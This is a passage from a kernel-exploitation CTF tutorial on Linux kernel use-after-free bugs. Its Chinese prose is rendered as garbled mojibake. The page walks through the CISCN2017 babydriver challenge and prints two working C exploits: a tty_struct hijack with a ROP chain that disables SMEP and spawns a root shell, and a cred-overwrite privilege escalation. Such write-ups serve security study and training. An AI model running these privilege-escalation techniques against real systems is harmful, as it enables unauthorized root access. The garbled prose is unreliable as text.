# kernel UAF

UAF å³ Use After Freeï¼Œé€šå¸¸æŒ‡çš„æ˜¯**å°æ–¼é‡‹æ”¾å¾Œæœªé‡ç½®çš„å‚æ‡¸æŒ‡é‡çš„åˆ©ç”¨**ï¼Œæ­¤å‰åœ¨ç”¨æˆ¶æ…‹ä¸‹çš„ heap éšæ®µå°æ–¼ ptmalloc çš„åˆ©ç”¨å¾ˆå¤šéƒ½æ˜¯åŸºæ–¼UAFæ¼æ´é€²è¡Œé€²ä¸€æ­¥çš„åˆ©ç”¨ã€‚

åœ¨ CTF ç•¶ä¸­ï¼Œå…§æ ¸çš„â€œå †å…§å­˜â€ä¸»è¦æŒ‡çš„æ˜¯ç›´æ¥æ˜ å°„å€ï¼ˆdirect mapping areaï¼‰ï¼Œå¸¸ç”¨çš„åˆ†é…å‡½æ•¸ kmalloc å¾æ­¤è™•åˆ†é…å…§å­˜ï¼Œå¸¸ç”¨çš„åˆ†é…å™¨çˆ² slubï¼Œè‹¥æ˜¯åœ¨ kernel ä¸­å­˜åœ¨ç€å‚æ‡¸æŒ‡é‡ï¼Œæˆ‘å€‘åŒæ¨£å¯ä»¥ä»¥æ­¤å®Œæˆå° slab/slub å…§å­˜åˆ†é…å™¨çš„åˆ©ç”¨ï¼Œé€šé Kernel UAF å®Œæˆææ¬Šã€‚

## å…§æ ¸å †åˆ©ç”¨èˆ‡ç¶æ ¸

slub allocator æœƒå„ªå…ˆå¾ç•¶å‰æ ¸å¿ƒçš„ `kmem_cache_cpu` ä¸­é€²è¡Œå…§å­˜åˆ†é…ï¼Œåœ¨å¤šæ ¸æ¶æ§‹ä¸‹å­˜åœ¨å¤šå€‹ `kmem_cache_cpu` ï¼Œç”±æ–¼é€²ç¨‹èª¿åº¦ç®—æ³•æœƒä¿æŒæ ¸å¿ƒé–“çš„è² è¼‰å‡è¡¡ï¼Œå› æ­¤æˆ‘å€‘çš„ exp é€²ç¨‹å¯èƒ½æœƒè¢«åœ¨ä¸åŒçš„æ ¸å¿ƒä¸Šé‹è¡Œï¼Œé€™ä¹Ÿå°±å°è‡´äº†åˆ©ç”¨éç¨‹ä¸­ kernel object çš„åˆ†é…æœ‰å¯èƒ½æœƒä¾†è‡ªä¸åŒçš„ `kmem_cache_cpu` ï¼Œé€™ä½¿å¾—åˆ©ç”¨æ¨¡å‹è®Šå¾—è¤‡é›œï¼Œä¹Ÿé™ä½äº†æ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡ã€‚

> æ¯”å¦‚èªªä½ åœ¨ core 0 ä¸Šæ•´äº†å€‹ double freeï¼Œæº–å‚™ä¸‹ä¸€æ­¥åˆ©ç”¨æ™‚ exp è·‘åˆ° core 1å»äº†ï¼Œé‚£å°±å¾ˆå®¹æ˜“è®“äººæ‘¸ä¸ç€é ­è…¦ :ï¼ˆ

å› æ­¤çˆ²äº†ä¿è­‰æ¼æ´åˆ©ç”¨çš„ç©©å®šï¼Œ**æˆ‘å€‘éœ€è¦å°‡æˆ‘å€‘çš„é€²ç¨‹ç¶å®šåˆ°ç‰¹å®šçš„æŸå€‹ CPU æ ¸å¿ƒä¸Š**ï¼Œé€™æ¨£ slub allocator çš„æ¨¡å‹å°æˆ‘å€‘è€Œè¨€ä¾¿ç°¡åŒ–æˆäº† `kmem_cache_node + kmem_cache_cpu` ï¼Œæˆ‘å€‘ä¹Ÿèƒ½æ›´åŠ æ–¹ä¾¿åœ°é€²è¡Œæ¼æ´åˆ©ç”¨ã€‚

ç¾ç­†è€…çµ¦å‡ºå¦‚ä¸‹å°‡ exp é€²ç¨‹ç¶å®šè‡³æŒ‡å®šæ ¸å¿ƒçš„æ¨¡æ¿ï¼š

```c
#include <sched.h>

/* to run the exp on the specific core only */
void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}
```

## é€šç”¨ kmalloc flag

`GFP_KERNEL` èˆ‡ `GFP_KERNEL_ACCOUNT`  æ˜¯å…§æ ¸ä¸­æœ€çˆ²å¸¸è¦‹èˆ‡é€šç”¨çš„åˆ†é… flagï¼Œå¸¸è¦æƒ…æ³ä¸‹ä»–å€‘çš„åˆ†é…éƒ½ä¾†è‡ªåŒä¸€å€‹ `kmem_cache` â€”â€”å³é€šç”¨çš„ `kmalloc-xx` ã€‚

é€™å…©ç¨® flag çš„å€åˆ¥ä¸»è¦åœ¨æ–¼ `GFP_KERNEL_ACCOUNT` æ¯” `GFP_KERNEL` å¤šäº†ä¸€å€‹å±¬æ€§â€”â€”**è¡¨ç¤ºè©²å°è±¡èˆ‡ä¾†è‡ªç”¨æˆ¶ç©ºé–“çš„æ•¸æ“šç›¸é—œè¯**ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥çœ‹åˆ°è«¸å¦‚ `msg_msg` ã€`pipe_buffer`ã€`sk_buffçš„æ•¸æ“šåŒ…` çš„åˆ†é…ä½¿ç”¨çš„éƒ½æ˜¯ `GFP_KERNEL_ACCOUNT` ï¼Œè€Œ `ldt_struct` ã€`packet_socket` ç­‰èˆ‡ç”¨æˆ¶ç©ºé–“æ•¸æ“šæ²’æœ‰ç›´æ¥é—œè¯çš„çµæ§‹é«”å‰‡ä½¿ç”¨ `GFP_KERNEL`ã€‚

åœ¨5.9 ç‰ˆæœ¬ä¹‹å‰`GFP_KERNEL` èˆ‡ `GFP_KERNEL_ACCOUNT` å­˜åœ¨éš”é›¢æ©Ÿåˆ¶ï¼Œåœ¨ [é€™å€‹ commit](https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792) ä¸­å–æ¶ˆäº†éš”é›¢æ©Ÿåˆ¶ï¼Œè‡ªå…§æ ¸ç‰ˆæœ¬ 5.14 èµ·ï¼Œåœ¨ [é€™å€‹ commit](https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552) ç•¶ä¸­åˆé‡æ–°å¼•å…¥ï¼š

- å°æ–¼é–‹å•“äº† `CONFIG_MEMCG_KMEM` ç·¨è­¯é¸é …çš„ kernel è€Œè¨€ï¼ˆé€šå¸¸éƒ½æ˜¯é»˜èªé–‹å•“ï¼‰ï¼Œå…¶æœƒçˆ²ä½¿ç”¨ `GFP_KERNEL_ACCOUNT` é€²è¡Œåˆ†é…çš„é€šç”¨å°è±¡**å‰µå»ºä¸€çµ„ç¨ç«‹çš„ `kmem_cache` â€”â€”åçˆ² `kmalloc-cg-*`** ï¼Œå¾è€Œå°è‡´ä½¿ç”¨é€™å…©ç¨® flag çš„ object ä¹‹é–“çš„éš”é›¢ã€‚

## slub åˆä½µ & éš”é›¢

slab alias æ©Ÿåˆ¶æ˜¯ä¸€ç¨®å°åŒç­‰/ç›¸è¿‘å¤§å° object çš„ `kmem_cache` é€²è¡Œ**è¤‡ç”¨**çš„ä¸€ç¨®æ©Ÿåˆ¶ï¼š

- ç•¶ä¸€å€‹ `kmem_cache` åœ¨å‰µå»ºæ™‚ï¼Œè‹¥å·²ç¶“å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰/è¿‘ä¼¼å¤§å°çš„ object çš„ `kmem_cache` ï¼Œå‰‡**ä¸æœƒå‰µå»ºæ–°çš„ kmem\_cacheï¼Œè€Œæ˜¯çˆ²åŸæœ‰çš„ kmem\_cache èµ·ä¸€å€‹ aliasï¼Œä½œçˆ²â€œæ–°çš„â€ kmem\_cache è¿”å›**ã€‚

èˆ‰å€‹ğŸŒ°ï¼Œ`cred_jar` æ˜¯å°ˆé–€ç”¨ä»¥åˆ†é… `cred` çµæ§‹é«”çš„ `kmem_cache`ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶çˆ² `kmalloc-192` çš„ aliasï¼Œå³ cred çµæ§‹é«”èˆ‡å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½æœƒå¾åŒä¸€å€‹ `kmem_cache`â€”â€”`kmalloc-192` ä¸­åˆ†é…ã€‚

å°æ–¼åˆå§‹åŒ–æ™‚è¨­ç½®äº† `SLAB_ACCOUNT` é€™ä¸€ flag çš„ `kmem_cache` è€Œè¨€ï¼Œå‰‡æœƒæ–°å»ºä¸€å€‹æ–°çš„ `kmem_cache` è€Œéçˆ²åŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å…§æ ¸ç•¶ä¸­ `cred_jar` èˆ‡ `kmalloc-192` ä¾¿æ˜¯å…©å€‹ç¨ç«‹çš„ `kmem_cache`ï¼Œ**å½¼æ­¤ä¹‹é–“äº’ä¸å¹¹æ“¾**ã€‚

## ä¾‹é¡Œï¼šCISCN2017 - babydriver
[attachment here](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)

### åˆ†æ
å…ˆè§£å£“ rootfs.cpio çœ‹ä¸€ä¸‹æœ‰ä»€éº¼æ–‡ä»¶
```bash
CISCN2017_babydriver [masterâ—] mkdir core
CISCN2017_babydriver [masterâ—] cd core 
core [masterâ—] mv ../rootfs.cpio rootfs.cpio.gz
core [masterâ—â—] gunzip ./rootfs.cpio.gz 
core [masterâ—] ls
rootfs.cpio
core [masterâ—] cpio -idmv < rootfs.cpio 
.
etc
etc/init.d
etc/passwd
etc/group
...
...
usr/sbin/rdev
usr/sbin/ether-wake
tmp
linuxrc
home
home/ctf
5556 å¡Š
core [masterâ—] ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
core [masterâ—] bat init
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: init
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ #!/bin/sh
   2   â”‚
   3   â”‚ mount -t proc none /proc
   4   â”‚ mount -t sysfs none /sys
   5   â”‚ mount -t devtmpfs devtmpfs /dev
   6   â”‚ chown root:root flag
   7   â”‚ chmod 400 flag
   8   â”‚ exec 0</dev/console
   9   â”‚ exec 1>/dev/console
  10   â”‚ exec 2>/dev/console
  11   â”‚
  12   â”‚ insmod /lib/modules/4.4.72/babydriver.ko
  13   â”‚ chmod 777 /dev/babydev
  14   â”‚ echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
  15   â”‚ setsid cttyhack setuidgid 1000 sh
  16   â”‚
  17   â”‚ umount /proc
  18   â”‚ umount /sys
  19   â”‚ poweroff -d 0  -f
  20   â”‚
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```
æ ¹æ“š init çš„å…§å®¹ï¼Œ12 è¡ŒåŠ è¼‰äº† `babydriver.ko` é€™å€‹é©…å‹•ï¼Œæ ¹æ“š pwn çš„ä¸€èˆ¬å¥—è·¯ï¼Œé€™å€‹å°±æ˜¯æœ‰æ¼æ´çš„ LKM äº†ã€‚init çš„å…¶ä»–å‘½ä»¤éƒ½æ˜¯ linux å¸¸ç”¨çš„å‘½ä»¤ï¼Œå°±ä¸å†è§£é‡‹äº†ã€‚

æŠŠé€™å€‹é©…å‹•æ–‡ä»¶æ‹¿å‡ºä¾†ã€‚

```bash
core [masterâ—] cp ./lib/modules/4.4.72/babydriver.ko ..
core [masterâ—] cd ..
CISCN2017_babydriver [masterâ—] check ./babydriver.ko
./babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped
[*] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```
æ²’æœ‰é–‹ PIEï¼Œç„¡ canary ä¿è­·ï¼Œæ²’æœ‰å»é™¤ç¬¦è™Ÿè¡¨ï¼Œå¾ˆ niceã€‚

ç”¨ IDA æ‰“é–‹åˆ†æï¼Œæ—¢ç„¶æ²’æœ‰å»é™¤ç¬¦è™Ÿè¡¨ï¼Œshift + F9 å…ˆçœ‹ä¸€ä¸‹æœ‰ä»€éº¼çµæ§‹é«”ï¼Œå¯ä»¥ç™¼ç¾å¦‚ä¸‹çš„çµæ§‹é«”ï¼š
```asm
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
00000000                                         ; XREF: .bss:babydev_struct/r
00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
00000000                                         ; babyopen+26/w ... ; offset
00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
00000008                                         ; babyioctl+3C/w ...
00000010 babydevice_t    ends
00000010
```

å†çœ‹ä¸€ä¸‹ä¸»è¦å‡½æ•¸

**babyioctl:** å®šç¾©äº† 0x10001 çš„å‘½ä»¤ï¼Œå¯ä»¥é‡‹æ”¾å…¨å±€è®Šé‡ babydev\_struct ä¸­çš„ device\_bufï¼Œå†æ ¹æ“šç”¨æˆ¶å‚³éçš„ size é‡æ–°ç”³è«‹ä¸€å¡Šå…§å­˜ï¼Œä¸¦è¨­ç½® device\_buf\_lenã€‚
```C
// local variable allocation has failed, the output may be wrong!
void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
  }
  else
  {
    printk("\x013defalut:arg is %ld\n", v3, v3);
  }
}
```

**babyopen:** ç”³è«‹ä¸€å¡Šç©ºé–“ï¼Œå¤§å°çˆ² 0x40 å­—ç¯€ï¼Œåœ°å€å­˜å„²åœ¨å…¨å±€è®Šé‡ babydev\_struct.device\_buf ä¸Šï¼Œä¸¦æ›´æ–° babydev\_struct.device\_buf\_len
```C
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

**babyread:** å…ˆæª¢æŸ¥é•·åº¦æ˜¯å¦å°æ–¼ babydev\_struct.device\_buf\_lenï¼Œç„¶å¾ŒæŠŠ babydev\_struct.device\_buf ä¸­çš„æ•¸æ“šæ‹·è²åˆ° buffer ä¸­ï¼Œbuffer å’Œé•·åº¦éƒ½æ˜¯ç”¨æˆ¶å‚³éçš„åƒæ•¸
```C
void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_to_user(buffer, babydev_struct.device_buf, v4);
  }
}
```

**babywrite:** é¡ä¼¼ babyreadï¼Œä¸åŒçš„æ˜¯å¾ buffer æ‹·è²åˆ°å…¨å±€è®Šé‡ä¸­
```C
void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_from_user(babydev_struct.device_buf, buffer, v4);
  }
}
```

**babyrelease:** é‡‹æ”¾ç©ºé–“ï¼Œæ²’ä»€éº¼å¥½èªªçš„
```C
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```

é‚„æœ‰ babydriver\_init() å’Œ babydriver\_exit() å…©å€‹å‡½æ•¸åˆ†åˆ¥å®Œæˆäº† **/dev/babydev** è¨­å‚™çš„åˆå§‹åŒ–å’Œæ¸…ç†ï¼ŒæŸ¥ä¸€ä¸‹å‡½æ•¸çš„ç”¨æ³•å³å¯ï¼Œä¸å†åˆ†æã€‚

### æ€è·¯

æ²’æœ‰ç”¨æˆ¶æ…‹å‚³çµ±çš„æº¢å‡ºç­‰æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å€‹åƒæ¢ä»¶ç«¶çˆ­å¼•ç™¼çš„ UAF æ¼æ´ï¼š

- å¦‚æœæˆ‘å€‘åŒæ™‚æ‰“é–‹å…©å€‹è¨­å‚™ï¼Œç¬¬äºŒæ¬¡æœƒè¦†è“‹ç¬¬ä¸€æ¬¡åˆ†é…çš„ç©ºé–“ï¼Œå› çˆ² babydev\_struct æ˜¯å…¨å±€çš„ã€‚åŒæ¨£ï¼Œå¦‚æœé‡‹æ”¾ç¬¬ä¸€å€‹ï¼Œé‚£éº¼ç¬¬äºŒå€‹å…¶å¯¦æ˜¯è¢«æ˜¯é‡‹æ”¾éçš„ï¼Œé€™æ¨£å°±é€ æˆäº†ä¸€å€‹ UAFã€‚

æ¥ä¸‹ä¾†è€ƒæ…®å¦‚ä½•é€šé UAF åŠ«æŒç¨‹åºåŸ·è¡Œæµï¼Œé€™è£æˆ‘å€‘é¸æ“‡ `tty_struct` çµæ§‹é«”ä½œçˆ² victim objectã€‚

åœ¨ ```/dev``` ä¸‹æœ‰ä¸€å€‹åƒçµ‚ç«¯è¨­å‚™ ```ptmx``` ï¼Œåœ¨æˆ‘å€‘æ‰“é–‹é€™å€‹è¨­å‚™æ™‚å…§æ ¸ä¸­æœƒå‰µå»ºä¸€å€‹ ```tty_struct``` çµæ§‹é«”ï¼Œèˆ‡å…¶ä»–é¡å‹è¨­å‚™ç›¸åŒï¼Œttyé©…å‹•è¨­å‚™ä¸­åŒæ¨£å­˜åœ¨ç€ä¸€å€‹å­˜æ”¾ç€å‡½æ•¸æŒ‡é‡çš„çµæ§‹é«” ``` tty_operations ```ã€‚

é‚£éº¼æˆ‘å€‘ä¸é›£æƒ³åˆ°çš„æ˜¯æˆ‘å€‘å¯ä»¥é€šé UAF åŠ«æŒ ```/dev/ptmx``` é€™å€‹è¨­å‚™çš„ ```tty_struct``` çµæ§‹é«”èˆ‡å…¶å…§éƒ¨çš„ ```tty_operations``` å‡½æ•¸è¡¨ï¼Œé‚£éº¼åœ¨æˆ‘å€‘å°é€™å€‹è¨­å‚™é€²è¡Œç›¸æ‡‰æ“ä½œï¼ˆå¦‚writeã€ioctlï¼‰æ™‚ä¾¿æœƒåŸ·è¡Œæˆ‘å€‘ä½ˆç½®å¥½çš„æƒ¡æ„å‡½æ•¸æŒ‡é‡ã€‚

ç”±æ–¼æ²’æœ‰é–‹å•“SMAPä¿è­·ï¼Œæ•…æˆ‘å€‘å¯ä»¥åœ¨ç”¨æˆ¶æ…‹é€²ç¨‹çš„æ£§ä¸Šä½ˆç½®ROPéˆèˆ‡ ```fake tty_operations``` çµæ§‹é«”ã€‚

> çµæ§‹é«” ```tty_struct```ä½æ–¼```include/linux/tty.h``` ä¸­ï¼Œ```tty_operations``` ä½æ–¼ ```include/linux/tty_driver.h``` ä¸­ã€‚
 
å…§æ ¸ä¸­æ²’æœ‰é¡ä¼¼ ```one_gadget``` ä¸€é¡çš„æ±è¥¿ï¼Œå› æ­¤çˆ²äº†å®ŒæˆROPæˆ‘å€‘é‚„éœ€è¦é€²è¡Œä¸€æ¬¡**æ£§é·ç§»**

ä½¿ç”¨gdbé€²è¡Œèª¿è©¦ï¼Œè§€å¯Ÿå…§æ ¸åœ¨èª¿ç”¨æˆ‘å€‘çš„æƒ¡æ„å‡½æ•¸æŒ‡é‡æ™‚å„å¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘å€‘åœ¨é€™è£é¸æ“‡åŠ«æŒ ```tty_operaionts``` çµæ§‹é«”åˆ°ç”¨æˆ¶æ…‹çš„æ£§ä¸Šï¼Œä¸¦é¸æ“‡ä»»æ„ä¸€æ¢å…§æ ¸gadgetä½œçˆ²fake ttyå‡½æ•¸æŒ‡é‡ä»¥æ–¹ä¾¿ä¸‹æ–·é»ï¼š

![image.png](figure/ttyops_debug.png)

æˆ‘å€‘ä¸é›£è§€å¯Ÿåˆ°ï¼Œåœ¨æˆ‘å€‘èª¿ç”¨```tty_operations->write```æ™‚ï¼Œ**å…¶raxå¯„å­˜å™¨ä¸­å­˜æ”¾çš„ä¾¿æ˜¯tty\_operationsçµæ§‹é«”çš„åœ°å€**ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘å€‘èƒ½å¤ åœ¨å…§æ ¸ä¸­æ‰¾åˆ°å½¢å¦‚```mov rsp, rax```çš„gadgetï¼Œä¾¿èƒ½å¤ æˆåŠŸåœ°å°‡æ£§é·ç§»åˆ°```tty_operations```çµæ§‹é«”çš„é–‹é ­ã€‚

ä½¿ç”¨ROPgadgetæŸ¥æ‰¾ç›¸é—œgadgetï¼Œç™¼ç¾æœ‰å…©æ¢ç¬¦åˆæˆ‘å€‘è¦æ±‚çš„gadgetï¼š

![image.png](figure/ttygadget.png)

gdbèª¿è©¦ï¼Œç™¼ç¾ç¬¬ä¸€æ¢gadgetå…¶å¯¦ç­‰åƒ¹æ–¼```mov rsp, rax ; dec ebx ; ret```ï¼š

![image.png](figure/ttygadget2.png)

é‚£éº¼åˆ©ç”¨é€™æ¢gadgetæˆ‘å€‘ä¾¿å¯ä»¥å¾ˆå¥½åœ°å®Œæˆæ£§é·ç§»çš„éç¨‹ï¼ŒåŸ·è¡Œæˆ‘å€‘æ‰€æ§‹é€ çš„ROPéˆã€‚

è€Œ```tty_operations```çµæ§‹é«”é–‹é ­åˆ°å…¶writeæŒ‡é‡é–“çš„ç©ºé–“è¼ƒå°ï¼Œå› æ­¤æˆ‘å€‘é‚„éœ€è¦é€²è¡ŒäºŒæ¬¡æ£§é·ç§»ï¼Œé€™è£éš¨ä¾¿é¸ä¸€æ¢æ”¹raxçš„gadgetå³å¯ï¼š

![image.png](figure/ttygadget3.png)

### Exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef

size_t commit_creds = NULL, prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

int main(void)
{
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    saveStatus();

    //get the addr
    FILE* sym_table_fd = fopen("/proc/kallsyms", "r");
    if(sym_table_fd < 0)
    {
        printf("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n");
        exit(-1);
    }
    char buf[0x50], type[0x10];
    size_t addr;
    while(fscanf(sym_table_fd, "%llx%s%s", &addr, type, buf))
    {
        if(prepare_kernel_cred && commit_creds)
            break;

        if(!commit_creds && !strcmp(buf, "commit_creds"))
        {
            commit_creds = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n", prepare_kernel_cred);
            continue;
        }
    }

    size_t rop[0x20], p = 0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = getRootPrivilige;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ_RET;
    rop[p++] = getRootShell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
    rop[p++] = user_ss;

    size_t fake_op[0x30];
    for(int i = 0; i < 0x10; i++)
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;

    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;

    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    size_t fake_tty[0x20];
    int fd3 = open("/dev/ptmx", 2);
    read(fd2, fake_tty, 0x40);
    fake_tty[3] = fake_op;
    write(fd2, fake_tty, 0x40);

    write(fd3, buf, 0x8);

    return 0;
}
```

### Old Solution

é€™é“é¡Œåœ¨ç•¶å¹´çš„è§£æ³•æ˜¯**é€šé UAF ä¿®æ”¹è©²é€²ç¨‹çš„ cred çµæ§‹é«”çš„ uidã€gid çˆ²0**ï¼Œååˆ†ç°¡å–®ååˆ†ç™½çµ¦ã€‚

ä½†æ˜¯**æ­¤ç¨®æ–¹æ³•åœ¨è¼ƒæ–°ç‰ˆæœ¬ kernel ä¸­å·²ä¸å¯è¡Œï¼Œæˆ‘å€‘å·²ç„¡æ³•ç›´æ¥åˆ†é…åˆ° cred\_jar ä¸­çš„ object**ï¼Œé€™æ˜¯å› çˆ² cred\_jar åœ¨å‰µå»ºæ™‚è¨­ç½®äº† `SLAB_ACCOUNT` æ¨™è¨˜ï¼Œåœ¨ `CONFIG_MEMCG_KMEM=y` æ™‚ï¼ˆé»˜èªé–‹å•“ï¼‰**cred\_jar ä¸æœƒå†èˆ‡ç›¸åŒå¤§å°çš„ kmalloc-192 é€²è¡Œåˆä½µ**

> ä¾†è‡ªå…§æ ¸æºç¢¼ 4.5 `kernel/cred.c`
>
> ```c
> void __init cred_init(void)
> {
> 	/* allocate a slab in which we can store credentials */
> 	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
> 			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
> }
> ```
>
> æœ¬é¡Œï¼ˆ4.4.72ï¼‰ï¼š
>
> ```c
> void __init cred_init(void)
> {
> 	/* allocate a slab in which we can store credentials */
> 	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
> 				     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
> }
> ```

å› æ­¤é€™è£è€ƒæ…®ä»‹ç´¹æ›´åŠ é€šç”¨çš„è§£æ³•ï¼Œå°èˆŠçš„è§£æ³•æ„Ÿèˆˆè¶£çš„å¯ä»¥åƒè€ƒå¦‚ä¸‹expï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

int main(void)
{
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");

    ioctl(fd1, 0x10001, 0xa8); /* object to be reused as the child's cred */
    close(fd1);

    int pid = fork();

    if(pid < 0) {
        printf("\033[31m\033[1m[x] Unable to fork.\033[0m\n");
        return -1;
    }
    else if(pid == 0) { /* the child to get the UAF cred */
        char buf[30];

        memset(buf, '\0', sizeof(buf));
        write(fd2, buf, 28);  /* overwrite uid&gid to 0 directly */

        if(getuid() == 0) {
            puts("\033[32m\033[1m[+] Successful to get the root.\033[0m\n");
            system("/bin/sh");
            return 0;
        } else {
            printf("\033[31m\033[1m[x] Failed to get the root.\033[0m\n");
            return -1;
        }
    }
    else { /* the parent */
        wait(NULL); /* waiting for the child to be done */
    }

    return 0;
}
```



## Reference

https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free

https://bbs.pediy.com/thread-247054.htm

https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html

